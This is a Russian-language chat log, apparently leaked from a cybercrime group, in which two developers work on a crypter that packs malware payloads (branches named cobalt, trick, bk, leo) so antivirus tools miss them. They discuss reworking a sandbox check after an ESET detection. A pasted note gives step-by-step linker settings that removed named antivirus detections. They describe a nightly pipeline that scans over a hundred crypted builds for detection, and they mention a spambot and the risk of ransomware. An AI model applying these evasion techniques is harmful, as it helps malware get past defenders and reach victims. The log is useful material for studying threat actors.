[18.08.21 10:09:50] elroy:		Надо бы развеить твои сомнения насчет double, д и вообще любых типов данных в c/c++
double отображает участок из 8 байт в памяти, как число с плавающей запятой. По сути, это те же 8 байт что и были, только работа с ними идет другим командами, компилятор генерирует комманды для работы с плавающей запятой. Но по факту, передается те же самые 8 байт или указатель на них.
Для того чтобы перенести данные double в файл (т.е. сгенерировать в SolutionBuilder и записать в .h как число, надо переносить байты. И потом эти байты переносить в число double уже в самом UniCrypter. Это делается двумя способами:
```
// SolutionBuilder
double key; // 8 байт
unsigned long long key_as_bytes; // 8 байт
key = 3.14; // например
key_as_bytes = *((unsigned long long*)&key); // те же 8 байт. наполняем из памяти double
// далее сохраняем занчение unsigned long long, ничего никуда не пропадет, все до байта вернется в double на месте
```
```
// UniCrypter
const unsigned long long key_as_bytes = 0x0011223344556677; // напрмиер
double key = *((double*)&key_as_bytes);
// и double на месте как и был
```
[18.08.21 10:10:40] elroy:		Второй способ - прочитай про union типы, собственно, тоже самое, два типа накладываются на один участок памяти.
[18.08.21 10:11:06] basil:		все оказывается было гораздо проще....
[18.08.21 10:11:40] elroy:		Второе
Используй в таком случае 4 байта - тип float
[18.08.21 10:12:01] basil:		хорошо. а как же тогда быть со вторым пунктом?
[18.08.21 10:12:29] basil:		я наверное чего-то не знаю
[18.08.21 10:12:48] elroy:		Второе
Используй в таком случае 4 байта - тип float
[18.08.21 10:13:40] elroy:		Вместо double
[18.08.21 10:14:44] elroy:		Чем больше длина мантисы, тем больше байт будет задействовано в double, он хранит у себя порядок и мантису, для 3.14, мантиса маленькая (314) в 10тичном и там какая-то хрень, не помню уже, в твоичном), порядок тоже маленький.
[18.08.21 10:15:33] basil:		хорошо. согласен. был не прав(((((((
[18.08.21 10:15:55] basil:		все было гораздо проще
[18.08.21 10:16:40] elroy:		Хорошо. Просто сделай это ))
[18.08.21 10:16:50] elroy:		Функцию там для генерации новых значений, может математический ряд какой-то взять, чуть чуть его переделать)
[18.08.21 10:17:40] elroy:		Важно чтобы оба значения считались одинаково, что при запаковке, что при распаковке.
[18.08.21 10:18:23] basil:		да. согласен. хорошо. ок. Ну как же все таки все проще было....
[18.08.21 10:18:29] basil:		Мда....
[18.08.21 14:34:56] basil:		есть. Работет. Сейчас загружу
[18.08.21 14:35:02] basil:		пардон
[18.08.21 14:35:12] basil:		тест
[18.08.21 14:35:16] basil:		вот так лучше
[18.08.21 14:35:19] elroy:		тест ок
[18.08.21 14:35:34] basil:		первое сообщение дошло?
[18.08.21 14:35:43] elroy:		Нет
[18.08.21 14:35:51] basil:		есть. Работет. Сейчас загружу
[18.08.21 14:36:23] elroy:		Проверил, все работает? Все криптуется?)
[18.08.21 14:36:28] elroy:		Все разворачивается?
[18.08.21 14:36:53] basil:		ну exe работет. Но dll не проверял
[18.08.21 14:37:42] elroy:		Ок, загружай. Я еще тебе софт скину, надо запустить у себя подержать 30 минут. Это тест алгоритма среды, тот что спалил есет, я переписал, надо проверить. Пока работает)
[18.08.21 14:38:02] basil:		хорошо. момент
[18.08.21 14:41:04] basil:		отправил. что нужно запустить?
[18.08.21 14:41:43] elroy:		Момент
[18.08.21 14:41:52] basil:		жду
[18.08.21 14:42:06] elroy:		Download: https://qaz.im/load/Qf4DF4/9H2y24
Delete: https://qaz.im/index.php?a=delete&q=1655627791
Nhhgfr4Desdx192030405060
[18.08.21 14:42:30] elroy:		там 2 exe, запускаешь - стоит., ждешь пока упадет...
Если падает, он пишет
```
To many tries! Total tries: ....
Press any key to continue (или что-то такое)
```
Пока все успешно работает, пишет в консоль OK периодически
Сетью не пользуется.
Задача запустить на паре систем на пол часика и потом посмотреть не упадет ли (т.е. не напишет ли в консоль сообщени выше)
[18.08.21 14:43:12] basil:		сразу оба файла запускать?
[18.08.21 14:43:22] basil:		сеть нужна? или отключать?
[18.08.21 14:43:33] basil:		на хосте или ВМ?
[18.08.21 14:45:13] elroy:		Можно и на хосте и на вм, они безопасные, сеть там не используется, только алгоритм проверки
[18.08.21 14:45:20] elroy:		Да, можно сразу два
[18.08.21 14:46:46] basil:		запустил. ждем-с
[18.08.21 15:30:28] elroy:		Не падало?
[18.08.21 15:30:46] basil:		как часы)))
[18.08.21 15:30:55] elroy:		Прекрасно
[18.08.21 15:31:05] elroy:		Выключай часы)
[18.08.21 15:31:13] basil:		хорошо)))
[19.08.21 16:22:02] elroy:		Приветствую
[19.08.21 16:22:10] basil:		ПРиветствую
[19.08.21 16:22:28] elroy:		Я пока не смотрел, все никак не доберусь
[19.08.21 16:22:43] elroy:		Ты чем-то занят сейчас?
[19.08.21 16:23:05] basil:		жду может кто напишет... Вспомнит про меня)))
[19.08.21 16:23:19] elroy:		Не конкретно сейчас, а в пределах этих дней
[19.08.21 16:23:59] basil:		относительно свободен. если еще что-то надо - говори. Всегда готов! Как пионЭр!
[19.08.21 16:24:30] elroy:		По спамботу все готово?
[19.08.21 16:24:52] basil:		ну пока вроде все..... Так по крайней мере было
[19.08.21 16:24:55] elroy:		Надо только изучить там запрос праоля как бороться и неотправку почты. Так?
[19.08.21 16:25:22] basil:		Да пожалуй это надо сделать
[19.08.21 16:25:25] basil:		кстати говоря
[19.08.21 16:25:49] elroy:		С твоими новыми особенностями графика интернета нет, а он нужен чтобы рыскать эту информацию. Как быть?
[19.08.21 16:26:49] basil:		не могу однозначно ответить на вопрос. А что надо узнать?
[19.08.21 16:26:59] basil:		каккую информацию искать?
[19.08.21 16:28:13] elroy:		Искать информацию как побороть аутлук чтобы пароль не просил. Или какиее варианты решения проблемы?
[19.08.21 16:29:44] basil:		Хорошо. я понял задачу..... Но честно говоря даже не представляю как ее можно попробовать решить.... Вот может как-то можно сбросить пароль
[19.08.21 16:29:57] basil:		по умолчанию его сделать
[19.08.21 16:30:14] basil:		не справшивать пароль.....
[19.08.21 16:30:31] basil:		это наверное где-то в настройках есть. Мне так кажется
[19.08.21 16:30:55] basil:		Да. Надо наверное в эту сторону копать
[19.08.21 16:32:30] basil:		Хорошо . Займусь этой проблематикой
[19.08.21 16:34:12] elroy:		Мне бы понять когда ты можешь искать информацию.
[19.08.21 16:34:27] elroy:		Если не можешь искать, тогда пока можно сменить задачу.
[19.08.21 16:34:48] elroy:		Но мне нужно знать точно, чем можешь эффективно заниматься
[19.08.21 16:35:08] basil:		В основном конечно вечером. Днем все таки проблематично
[19.08.21 16:36:35] basil:		там есть вариант, так сказать , легальное подключение к интернету. Т.е. стоят в отдельной комнате компьютеры с интернетом, но все что я там нажимаю - все пишется в логи
[19.08.21 16:38:17] elroy:		Забудь)
[19.08.21 16:38:17] basil:		Думал может от туда, поотключать там все втихаря. Но все запаролено. И еще сзади как-то мутный тип за всем этим процессом наблюдает
[19.08.21 16:39:05] basil:		Ну вот я ходил-ходил вокруг этой комнаты - облизывался. Но потом все таки решил , что не вариант
[19.08.21 16:42:25] elroy:		Ясно, надо тогда сменить пока задачу.
[19.08.21 16:42:33] elroy:		ПОдумай над решением проблемы
[19.08.21 16:43:06] basil:		хорошо
[19.08.21 16:43:35] elroy:		Насчет задачи, та доработка с криптером
[19.08.21 16:43:46] elroy:		У меня пок анет возможности все изучить
[19.08.21 16:44:50] elroy:		Соберри доработку в develop, разлей develop по остальным веткам из серии develop, проверь работоспособность профилей. в beta_ ветки пока не вливай
[19.08.21 16:45:05] basil:		Хорошо.
[19.08.21 16:47:54] basil:		Но честно говоря текущий вариант мне самому не очень нравится. Я изначально хотел сделать паковщик , который шифрует данные, сделать так, чтобы в любой момент можно было сметить алгоритм шифрования или добавить к уже существующим новый. Но текущий конечный вариант - мне как-то не совсем нравится. Кривой какой-то
[19.08.21 16:49:00] elroy:		Так кто его писал?))
[19.08.21 16:49:15] basil:		я конечно....
[19.08.21 16:49:55] elroy:		Там надо и способ хранения в самом крипте переделать, crt палится
[19.08.21 16:50:17] elroy:		Разммер итогового крипта очень болшой
[19.08.21 16:51:03] elroy:		В общем, сначала влей что сделал по ветка м и проверь, как я писал выше. А потом конечно это бы все доработать
[19.08.21 16:53:56] basil:		вопрос есть. Я все момент, связанные с использованием STL убрал, стандарные вызовы malloc , memcpy обфусцировал. Что может палиться? Что пподразумевается  под термином  crt ?
[19.08.21 16:54:05] basil:		моменты*
[19.08.21 16:56:21] elroy:		Последние сообщения не пришли
[19.08.21 16:56:46] basil:		вопрос есть. Я все моменты, связанные с использованием STL убрал, стандарные вызовы malloc , memcpy обфусцировал. Что может палиться? Что подразумевается под термином crt ?
[19.08.21 16:58:03] elroy:		В свойствах проекта нужно исключиьт все стандартные библиотеки, тогда и crt уйдет
[19.08.21 16:58:36] elroy:		Она там есть как минимум потому, что dllmain или main для exe запускается через crt
[19.08.21 16:59:10] elroy:		Вот когда исключишь, поймешь, что те же векторы отвалятся и еще многго чего
[19.08.21 16:59:16] elroy:		Оно не соберется
[19.08.21 16:59:32] elroy:		Потом надо понемногу разгребсти почему, подлатать
[19.08.21 16:59:42] elroy:		Тогда crt будет исключена
[19.08.21 17:00:34] elroy:		Потренируйся на hello worl программе
[19.08.21 17:00:47] basil:		хорошо. ок.
[19.08.21 17:02:31] elroy:		Кстати
[19.08.21 17:02:44] elroy:		Из записей одного нашего коллеги
[19.08.21 17:02:52] elroy:		```
18 февраля 2021
Устранено несколько детектов семейства Razy (Gen:Variant.Razy.717857, Gen:Variant.Razy.833523, Gen:Variant.Razy.842671) и Fugrafa (Gen:Variant.Fugrafa.112821) в 64-разрядной версии загрузчика.
Причина детекта - наличие большого количества непонятной информации в сегменте данных ".rdata".
Детекты были устранены после отлючения CRT. 
Краткая инструкция для отключения CRT:
1. Свойства конфигурации -> Компоновщик -> Ввод -> Игнорировать стандартные библиотеки (/NODEFAULTLIB)
2. Для того, чтобы работало выделение памяти для локальных переменных в стеке, необходимо добавить объектный файл chkstk.obj в разделе:
Свойства конфигурации -> Компоновщик -> Ввод -> Дополнительные зависимости
3. Для того, чтобы программа в ходе выполнения не проверяла стек, отключаем эту проверку:
Свойства конфигурации -> C/C++ -> Проверка безопасности -> Отключить проверку безопасности (/GS-)
В код и сегмент данных после этого не будут добавлятся так называемые security_cookie.
4. Изменить точку входа:
#pragma comment(linker, "/ENTRY:WinMain")
5. При необходимости, нужно написать собственные реализации некоторых функций, которых будет не хватать при компоновке.
В частности atexit:
int atexit(void(__cdecl* func)(void))
{
  return -1;
}
```
[19.08.21 17:04:09] basil:		забрал
[19.08.21 17:05:00] basil:		вот про это совсем не знал
[19.08.21 17:05:12] basil:		```
#pragma comment(linker, "/ENTRY:WinMain")
```
[19.08.21 17:05:51] basil:		Последнее дошло?
[19.08.21 17:06:17] elroy:		Я же не знаю, они не прономерованы)
Всего 4 сообщения пришло
[19.08.21 17:06:41] basil:		значит дошло. То что в рамке
[20.08.21 09:40:24] basil:		Приветствую
[20.08.21 09:44:19] elroy:		Приветствую
[20.08.21 09:46:54] basil:		Вчера попробовал разлить изменения по веткам. И сразу завис. Там несколько штук рабочих веток, видимо под специализированную нагрузку. В какие конкретно лить то? У меня остался маленький скрипт, который разливает изменения по отдельным веткам. Он подойдет?
```
git checkout develop
git pull

git checkout develop_payload_generic
git pull
git merge develop
git checkout beta_payload_generic
git pull
git merge develop_payload_generic

git checkout develop_payload_cobalt
git pull
git merge develop_payload_generic
git checkout beta_payload_cobalt
git pull
git merge develop_payload_cobalt

git checkout develop_payload_loader-bot-leo
git pull
git merge develop_payload_generic
git checkout beta_payload_loader-bot-leo
git pull
git merge develop_payload_loader-bot-leo

git checkout develop_payload_startw
git pull
git merge develop_payload_generic
git checkout beta_payload_payload_startw
git pull
git merge develop_payload_startw
```
[20.08.21 09:47:41] basil:		когда-то с помощью него разливали
[20.08.21 09:48:16] elroy:		Минуту, смотрю
[20.08.21 09:49:08] elroy:		Не, это устарело
[20.08.21 09:51:47] elroy:		git checkout develop
git pull
git checkout develop_payload_generic
git pull
git merge develop

И так в каждую ветку
 develop_payload_bk
 develop_payload_cobalt
 develop_payload_generic
 develop_payload_loader-bot-leo
 develop_payload_rundll
 develop_payload_trick
[20.08.21 09:52:52] elroy:		Т.е. всегда вливается generic

А вот это НЕ ПРАВИЛЬНО
```
git checkout develop_payload_cobalt
git pull
git merge develop_payload_generic
```
[20.08.21 09:53:13] elroy:		Стоп
[20.08.21 09:53:15] elroy:		Ошибка
[20.08.21 09:53:30] elroy:		*Т.е. всегда вливается develop
[20.08.21 09:55:17] basil:		Так. Хорошо. Т.е. я вливаю свою ветку в develop. Разрешаю конфликты. А потом разливаю из develop по веткам:
```
develop_payload_bk
develop_payload_cobalt
develop_payload_generic
develop_payload_loader-bot-leo
develop_payload_rundll
develop_payload_trick
```
[20.08.21 09:57:11] elroy:		Вливаешь себе develop, разрешашь кофликты, вливаешь свою ветку в девелоп. А потом правильно, вливаешь девелоп по остальным веткам
[20.08.21 09:57:32] basil:		все. отлично. Понял
[23.08.21 09:32:52] elroy:		Приветствую
[23.08.21 09:32:58] basil:		Приветствую
[23.08.21 09:33:24] elroy:		Разливал по веткам? Как результаты, все работает после разлива?
[23.08.21 09:34:07] basil:		Да по веткам разлил. При слиянии моей ветки и develop конфликтов не было. Все нормально.
[23.08.21 09:34:16] basil:		Разлил по остальным веткам.
[23.08.21 09:34:40] basil:		Develop несколько раз протестировал . Все было нормально
[23.08.21 09:35:06] basil:		Но честно говоря другие ветки не тестил. Там же какая то особая нагрузка нужна
[23.08.21 09:35:21] basil:		Но вроде были специализированы под нагрузку
[23.08.21 09:35:46] basil:		Они*
[23.08.21 09:36:43] elroy:		В панели есть LeoDllTest_x64, им можно проверить bk, rundll, leo
[23.08.21 09:37:06] elroy:		cobalt можно проверить rundll_64 и rundll_32
[23.08.21 09:37:36] basil:		а как их тестить? Можно подробнее. Я вот как-то от темы отстал. Не в курсе
[23.08.21 09:38:09] basil:		Какой там признак что нагрузка работает?
[23.08.21 09:41:19] elroy:		rundll32 file.dll,FuncName
Признак Leo - для профиля лео должно быть два сообщения, одно из dllmain, другое из имени функции, должнен быть арес к файлу, если крипт лео и пустое поле если rundll и bk
rundll_64 и rundll_32 - там просто сообщение, без пути, но пишется TLS отработал или error
[23.08.21 09:42:32] elroy:		FuncName можно посмотреть в оригинале LeoDllTest и rundll_32 и _64. Посмотреть можно либо загрузив файл в панель и отпавиив не тест, там в окошечке, что открывается, виндо имена функций в экспорте. Можно IDA или depends посмотреть
[23.08.21 09:43:30] elroy:		На рабочей машине ничего не запускать, только на тестовых, если что-то берешь из панели. Есть риск выдачи не того файла, можно шифровальщика случайно скачать (были инциденты, перестрахуйся)
[23.08.21 09:46:30] basil:		Хорошо. Еще один вопрос. Ключи для build.dat стандартные? Т.е.  например
```
build -p C:\\PayLoads\\leo.dll -s C:\\CryptoStore
```
[23.08.21 09:46:44] basil:		build,bat
[23.08.21 09:47:13] elroy:		Если надо пробростьб экспорт, то --gen-exports yes
[23.08.21 09:47:59] elroy:		Для всех трех профилей dll->dll - надо, для dll->exe - не надо
[23.08.21 09:48:38] basil:		хорошо
[23.08.21 09:48:46] basil:		Что-то еще?
[23.08.21 09:48:53] elroy:		Проверь еще ключи энтропии, тоже должно работать
[23.08.21 09:49:52] basil:		Всмысле установить заначение энтропии и проверить значения в конечно билде?
[23.08.21 09:50:46] elroy:		Такую проверку делает уже сам SolutionBuilder, он показывает получившуюся энтропию. Надо просто проверить работает файл или нет.
[23.08.21 09:51:20] basil:		ок. понял. хорошо
[23.08.21 09:51:42] elroy:		Ну и значения энтропии взглядом в консоль проверить на соответствие ожиданиям
[23.08.21 09:52:22] basil:		есть
[23.08.21 09:53:03] basil:		я без сарказма сказал... Если что. Проверю. Отчитаюсь
[23.08.21 09:53:20] elroy:		Хорошо)
[23.08.21 15:55:51] basil:		если в ветке develop_payload_loader-bot-leo. Я закриптую LeoDllTest_x64.dll . И далее вызову его с помощью команды
```
rundll32 LeoDllTest_x64.dll
```
Что должно произойти?
[23.08.21 15:56:19] elroy:		Я думаю ничего
[23.08.21 15:56:38] elroy:		Или dllmain только вызовется
[23.08.21 15:56:58] basil:		а как тогда правильно?
[23.08.21 15:57:30] elroy:		```
rundll32 lib.dll,FuncName
[23.08.21 15:58:04] elroy:		funcname смотришь по таблице экспорта
[23.08.21 15:58:22] elroy:		Для лео там PluginInit, например
[23.08.21 15:58:47] basil:		Да есть такая. Вижу
[23.08.21 17:04:04] basil:		Нет. Для  leo почему-то не работает
[23.08.21 17:15:20] elroy:		А что не работает?
[23.08.21 17:18:53] basil:		просто падение и все собсвенно говоря
[23.08.21 17:20:33] basil:		Собирает без ошибок. Новый компрессор в коде присутствует. Запускаю так
```
rundll32 crypted.dll,PluginInit
```
[23.08.21 17:22:29] elroy:		А с какой ошибкой падает?
[23.08.21 17:23:04] basil:		APPCRASH
[23.08.21 17:23:16] elroy:		Ну это не ошибка)
[23.08.21 17:23:22] elroy:		Дай скрин падения
[23.08.21 17:23:54] elroy:		У тебя есть доступ в дженкинс?
[23.08.21 17:25:54] basil:		наверное нет.
[23.08.21 17:26:15] elroy:		Дай скрин падения
[23.08.21 17:26:28] basil:		момент. сейчас
[23.08.21 17:27:53] basil:		hKbCtqOFLi$JF8u
[23.08.21 17:28:37] basil:		https://file.io/bIUgQMh1xAnc
[23.08.21 17:43:22] elroy:		Раскрашилось.
[23.08.21 17:43:25] elroy:		Неприятно
[23.08.21 17:47:30] basil:		Сам бинарник должен собираться корректно. Много раз в develop проверял. Там что-то еще. Можно ли криптор собрать с debug_printf?
[23.08.21 17:48:25] elroy:		Насчет debug_printf что-то может пойти не так, я не уверен
[23.08.21 17:48:33] elroy:		Мог сломать отладку
[23.08.21 17:48:43] elroy:		Там надо проверить порядок инициализации лога
[23.08.21 17:48:58] elroy:		Если он корректно инициализируется, то должно работать
[23.08.21 17:51:06] basil:		хорошо. Зайнимаюсь отладочной версией Тогда
[23.08.21 17:51:26] elroy:		Погоди, нет
[23.08.21 17:51:56] basil:		да слушаю
[23.08.21 17:51:57] elroy:		Я сейчас дам доступ в дженкинс, чуть позже, там настроишь билд из гита
[23.08.21 17:52:09] basil:		ок. жду
[23.08.21 17:52:14] elroy:		Возможно у тебя проблема с компилятором
[23.08.21 17:52:31] basil:		хорошо. Давай проверим
[23.08.21 18:15:10] elroy:		-----BEGIN PGP MESSAGE-----

hQIMA1vRWlS2107DARAAtYCRS1UOoEz7pekO71xyjFe8s2UVHFLKBcCRio/TthYj
9VpX6ZgKQn/BfgtM2tGF4lNVNS4K12hnrnTcvLmvAl1npzvUSELqj+M1ggc3QlcL
ATVeklc0IGIuEz4A60NPuVjx69qEsmnZt3oQlwls1TzzN1dfgZpap5fJt0pFoUl7
KY4bEbzRqnUdX8COGzz13MzeCPvTn/R5gYcqeDvzhBtbmm9zbiZ5MtIrXlnq8hR3
3Fh5m8ep+2gnMS+G9ALTVW442u/MBM50ODPZt8aOmTi8/wRlcKR+HiwQtK8JhBUm
Ih5kb2guUFXtvSKQ+kuTyOhA0/SU7bOh4Zodg+2R/Mh2i6wqhARnQ7U3YqHqxSmT
LxjKm24cB/ESHus/PBpPeibFiIguw5y1T0sSifr+kuv/iKz8I4iWvWXx0h7rEwwC
4QTzcJ5y6ZSL4XQmJPFSMzEcrHnggHFcWgbVzoKueB1o5pzFRQpIOa8YkxrdCZTM
WxqDWtAq7FakX5RCSl1rC0PDP4pf/lhSpABze2MwRA6lwWa95cjFs5M9+LaLrPYX
7yuE6/OGsnKC6j0HoXHxZBIGLZVayCb+5bJU8Y0tR9pNuqRyssvCAzpTZDFx8iW5
nr4ZlGkye7QU/uX0MffcF4RBwcWzMq9oVS4whCO8UXbcfkRaQrrdjxIkN+FZpjDS
dwHhVPAJ9tcT6IDCAR6IfxS1LiXqGPYsHcJnv4Pt+9xh/LIKOPlTCnyuhII/5qJC
AENJq7rlWUb3J3edEsBj0G7aOWyCSx6WsEChfv/ME7lbJbgRlShjJEFl1Bch9zT2
bJYBJuXCdow9D2HEKPG4LNLTnXAxKttJ
=pVSy
-----END PGP MESSAGE-----
[23.08.21 18:15:22] basil:		момент
[23.08.21 18:19:45] basil:		есть
[23.08.21 18:21:58] basil:		а можно поподробнее. Как с этим работать?
[23.08.21 18:22:33] elroy:		Как это работает
Удаляешь профиль crypter2_test_stub
Создаешь новый (new item)
При создании указываешь имя crypter2_test_stub
А в поле внизу пишешь имя нужного профиля, например crypter2_generic_exe
На его основе создается новый профиль
Нужно в настройка его поправить Build token, он должен соответствовать имени crypter2_test_stub
И ветку првишь на develop_......
Получаешь профиль, который собирает из develop_.... ветки.
В панели собирать testing_crypter2
[23.08.21 18:23:13] basil:		Ну все просто....))))
[23.08.21 18:23:26] basil:		хорошо. сейчас попробую это все запустить
[23.08.21 18:26:18] elroy:		У testing_crypter2 на входе может быть что угодно, на выходе файл будет с расширением dll, но по факту будет с тем расширением, которое сделает криптер. Т.е. если делаешь в exe, значит надо .dll переименовать в .exe, если dll - то ничего не надо
[23.08.21 18:27:27] basil:		удаляю crypter2_test_stub? Delete_project&
[23.08.21 18:27:29] basil:		?
[23.08.21 18:27:34] elroy:		да
[23.08.21 18:33:58] basil:		Почти все сделал. Кроме "В панели собирать testing_crypter2". Это где?
[23.08.21 18:34:07] elroy:		Криптопанель
[23.08.21 18:45:51] elroy:		Разобрался?
[23.08.21 18:46:29] basil:		слабо. честно говоря. Где эта панель в криптопанели?
[23.08.21 18:46:33] basil:		Не нахожу
[23.08.21 18:46:45] elroy:		У тебя есть вкладка two
[23.08.21 18:46:59] elroy:		У тебя есть вкладка testBuild
[23.08.21 18:47:12] elroy:		Их видишь,
[23.08.21 18:47:23] basil:		да
[23.08.21 18:47:26] basil:		их вижу
[23.08.21 18:47:29] basil:		эти вижу
[23.08.21 18:47:34] elroy:		Отлично
[23.08.21 18:47:49] elroy:		На вкладке testBuild есть файд Leo....
[23.08.21 18:47:58] basil:		есть
[23.08.21 18:48:02] basil:		вижу
[23.08.21 18:48:14] elroy:		Столбец Check
[23.08.21 18:48:20] elroy:		Там кнопка B
[23.08.21 18:48:24] elroy:		(build)
[23.08.21 18:48:30] basil:		есть
[23.08.21 18:49:00] elroy:		DLL functions: - это экспорт нагрузки (этого файла)
[23.08.21 18:49:10] elroy:		Payload type - это профиль
[23.08.21 18:49:25] elroy:		Надо выбрать TestStubs
[23.08.21 18:49:53] elroy:		Stubs profile - это криптер, которым криптовать
[23.08.21 18:50:34] basil:		профиль BotLeo?
[23.08.21 18:51:42] elroy:		BotLeo - это продакшн версия, т.е. профили будут предложены dll_leo_crypter2..,те что в дженкинсе
[23.08.21 18:51:50] elroy:		Надо выбрать TestStubs
[23.08.21 18:52:00] elroy:		Там будут профили testing_crypter2
[23.08.21 18:52:28] elroy:		Все что не TestSubs - это прод
[23.08.21 18:52:58] basil:		момент
[23.08.21 18:53:51] basil:		выбрал TestSubs, профили testing_crypter2
[23.08.21 18:53:55] basil:		профиль
[23.08.21 18:54:06] basil:		пошел процесс
[23.08.21 18:54:09] elroy:		Вижу, запустил билд
[23.08.21 18:54:36] elroy:		В дженкинсе можно посмотреть потом лог билда и окно вывода билда
[23.08.21 18:54:48] elroy:		Выбрать профиль
[23.08.21 18:55:07] elroy:		Выбрать слева номер билда, на стрелочку мышь и там console output
[23.08.21 18:55:22] elroy:		Или выбрать тоже самое, но нажать на сам билд
[23.08.21 18:55:41] elroy:		Откроется страница с его артифаками, там будет лог и файлы, если нужно
[23.08.21 18:55:52] elroy:		После билда файл придет в панель
[23.08.21 18:56:10] basil:		так. сейчас.
[23.08.21 18:57:04] elroy:		Вот только с этого момента, все файлы очень осторожно запускаешь, только на тестовых машнах. Были случаи
[23.08.21 18:57:44] basil:		да. Не просто так silver сказал "вот это комбайн!"
[23.08.21 18:58:00] elroy:		Комбайн не это)
[23.08.21 18:58:18] basil:		еще что-то есть?
[23.08.21 18:58:21] elroy:		Там есть страница в панели сверху, называется Auto test
[23.08.21 18:58:26] elroy:		Вот там комбайн
[23.08.21 18:58:44] basil:		про auto test ы как-то говорил
[23.08.21 18:58:47] elroy:		Всем криптерами собираются профили и автоматически отправляются на скан
[23.08.21 18:59:03] elroy:		Там больше сотни
[23.08.21 18:59:18] elroy:		В 3 часа ночи и до 10 билдится, проверяется
[23.08.21 18:59:26] elroy:		Потом видно что чистое, что нет
[23.08.21 18:59:37] basil:		вот это фирма!!!
[23.08.21 19:00:15] basil:		я прямо горЮсь , что работаю в такой организации. Жаль нельзя в резюме написать))))
[23.08.21 19:00:22] elroy:		Осталось аккаунты приделать и биток собирать)))
[23.08.21 19:00:53] basil:		кстати. Там говорят группа по крипте собирается
[23.08.21 19:01:11] basil:		силвер , вроде как в чате писал
[23.08.21 19:01:27] elroy:		Слухи)
[23.08.21 19:01:56] elroy:		Ладно. Разберись с файлом, что-то с ошибкой он собирается или нет)
[23.08.21 19:02:02] elroy:		Я пойду, до завтра)
[23.08.21 19:02:19] basil:		хорошо
[23.08.21 19:02:20] basil:		ок
[23.08.21 19:02:28] elroy:		Если что, orval напиши, он проконсультирует
[23.08.21 19:02:56] basil:		хорошо. спас ибо
[23.08.21 19:02:56] basil:		спасибо
[24.08.21 09:42:16] elroy:		Приветствую. Что-то вчера получилось?
[24.08.21 09:43:25] basil:		Приветствую.
 Да запустил билд. Он отработал. Лог нормальный. Всмысле dll получилось на выходе. Но что-то не так. Не работает крипт
[24.08.21 09:44:02] basil:		По крайней мере у меня. Я его запускал через rundll32. Но нет. CRASH
[24.08.21 09:44:42] basil:		в отдельной виртуалке
[24.08.21 09:44:55] elroy:		И не видишь где ?
[24.08.21 09:45:38] basil:		я пытался вчера debug_printf подключить , правда уже на своей машине
[24.08.21 09:45:49] basil:		Но он не заработал.
[24.08.21 09:46:09] basil:		Там может нужны какие-то манипуляции дополнительные?
[24.08.21 09:47:38] elroy:		Давай исходить из того, что до того как было слияние крипт работал. Следовательно надо сделать сравнение кода, увидеть что было, что стало. Берем и извлекаем гит в обе папки, в одной коммит до слияния, в другой после, сравниваем папки тотал-коммандером, например, смотрим что поменялось по строчкам (или сами файлы чем-то сравниваем, notepad++ например).
[24.08.21 09:48:45] elroy:		Если отличий не увидишь, в глаза не кинется, отлаживай места с изменениями
[24.08.21 09:49:07] elroy:		Постарайся это сделать к вечеру
[24.08.21 09:49:36] basil:		хорошо. Вопрос. UniCrypter для exe работает?
[24.08.21 09:49:48] elroy:		Да, и для dll и для exe
[24.08.21 09:50:02] basil:		вот для ветки в которой проблемы возникли?
[24.08.21 09:51:26] elroy:		Да, там крипт предусмотрен dll -> exe, чтобы работало надо --entrypoint <функция> указать, тогда стартанет dll, вызовется ее dllmain  пото вызовется функция (PluginInit, напрмер)
[24.08.21 09:52:13] elroy:		Это ветка rundll
[24.08.21 09:52:24] elroy:		На ее основе сделана ветка bk
[24.08.21 09:52:40] elroy:		На ее основе сделана ветка leo
[24.08.21 09:53:16] elroy:		Для веток bk и leo exe не требуется, не знаю, работает или нет
[24.08.21 09:53:31] basil:		хорошо. я понял
[24.08.21 14:45:44] basil:		Приветствую. Еще раз
[24.08.21 14:46:14] basil:		Нашел я все таки место. Где ошибка. Это новый паковщик
[24.08.21 14:46:56] basil:		Причем в ветке develop он работает. В ветке leo нет. Хотя код идентичен
[24.08.21 14:50:11] elroy:		А почему так, не удалось выяснить?
[24.08.21 14:50:14] basil:		Хоть убей не понимаю
[24.08.21 14:51:52] basil:		я N-ое количество раз прогнал его в develop. Причем как понимаешь, там различные размеры шифруемых блоков и применемом в них шифровании. И работало. А тут не работает
[24.08.21 14:52:44] elroy:		Осталось понять почему
[24.08.21 14:53:13] elroy:		И починить
[24.08.21 14:53:45] basil:		ну это да. еще бы понять. Что там чинить. Если все одинаковое
[24.08.21 14:54:08] elroy:		Значит не все
[24.08.21 14:54:36] elroy:		Проверял работу запаковщика/распаковщика?
[24.08.21 14:54:57] elroy:		А ты crt еще не выкинул?
[24.08.21 14:55:21] basil:		да. Естественно. И потом еще с живым файлом это тестировал. И тоже UniCrypter
[24.08.21 14:55:48] basil:		ctr нет. crt на том же месте
[24.08.21 14:55:52] elroy:		А падает на каком месте?
[24.08.21 14:56:36] basil:		ну вот он входит в packer.unpack и дальше уже из него не выходит
[24.08.21 14:56:49] basil:		т.е. однозначно в нем дело
[24.08.21 15:03:32] elroy:		Разберись в чем дело, отладь алгоритм. Возьми файлик несколько сот байт, пройдись отладчиком по алгоритму
[24.08.21 15:04:10] basil:		Да вот. Именно так и отлаживал. Даже больше могу сказать . Для такого дела использовал осмысленный текст
[24.08.21 15:04:23] basil:		и каждый отдельный буфер разглядывал
[24.08.21 15:05:54] elroy:		Почему возврата нет?
[24.08.21 15:05:57] elroy:		Почему он там остается?)
[24.08.21 15:06:39] basil:		мне кажется, что там обращение к недоступному региону памяти идет
[24.08.21 15:07:22] elroy:		Есть у меня такая мысль, что всему виной вектор.
[24.08.21 15:07:39] elroy:		Нельзя его как тип возвращать retutn
[24.08.21 15:07:45] basil:		похожу нашел в чем причина
[24.08.21 15:07:55] basil:		только вот сейчас в голову ударило
[24.08.21 15:08:36] basil:		дело в 
```
struct Entry
{
	size_t dataSize;
	unsigned char data[];
};
```
[24.08.21 15:09:02] basil:		а точнее в size_t  для 32 битных и 64 битных систем
[24.08.21 15:12:21] basil:		короче. понятно. скорее всего в этом дело.
[24.08.21 15:12:27] basil:		сейчас попробую поправить
[24.08.21 15:16:00] elroy:		Везде где ты используешь Entry, в качестве размера не константа должна быть, а sizeof(Entry)
[24.08.21 15:16:30] elroy:		Может там дело в Entry, переименовать надо
[24.08.21 15:16:54] elroy:		Может из заголовков где-то подтягивается
[24.08.21 15:17:13] basil:		проверяю
[24.08.21 15:17:16] basil:		гипотезу
[24.08.21 15:17:54] elroy:		Погоди
[24.08.21 15:18:09] basil:		да
